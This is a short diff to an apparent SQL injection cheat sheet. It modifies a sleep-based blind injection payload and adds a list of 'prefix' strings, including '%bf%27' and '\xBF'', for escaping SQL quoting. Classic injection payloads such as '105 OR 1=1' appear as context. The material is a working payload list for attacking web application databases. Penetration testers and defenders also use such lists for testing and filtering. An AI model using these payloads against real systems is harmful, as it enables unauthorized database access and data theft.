@@ -52,8 +52,16 @@ SQLInjection Basic Stuff
 '"
 105 OR 1=1
 " or ""="
-'%2b(select*from(select(sleep(20)))a)%2b'
+'%2b(select*from(select(sleep(20)))a)%2b'%bf%27
 '+(select*from(select(sleep(5)))a)+'
+```
+Interesting items that can be used to prefix attacks
+---------------------
+```
+prefix='('
+prefix='\xBF''
+prefix='%bf%27'
+prefix=''''
 ```
 Sqlmap quick cheat sheet
 -------------
